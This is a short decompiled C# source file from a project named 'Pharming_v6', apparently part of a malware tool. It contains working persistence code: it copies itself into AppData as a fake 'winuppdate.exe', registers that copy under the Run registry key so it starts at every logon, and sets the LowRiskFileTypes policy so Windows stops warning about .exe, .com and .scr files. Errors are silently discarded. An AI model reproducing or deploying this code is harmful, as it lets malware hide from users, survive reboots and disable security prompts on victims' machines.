using System;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Pharming_v6.My;

namespace Pharming_v6;

[StandardModule]
internal sealed class pharmnova
{
	public static void pharmnova()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Assembly.GetExecutingAssembly().Location, Module1.appdata + "\\winuppdate\\winuppdate.exe", true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("WinUppdate", "\"" + Module1.appdata + "\\winuppdate\\winuppdate.exe\" -autorun");
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations");
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", writable: true)!.SetValue("LowRiskFileTypes", ".exe;.com;.scr");
	}
}
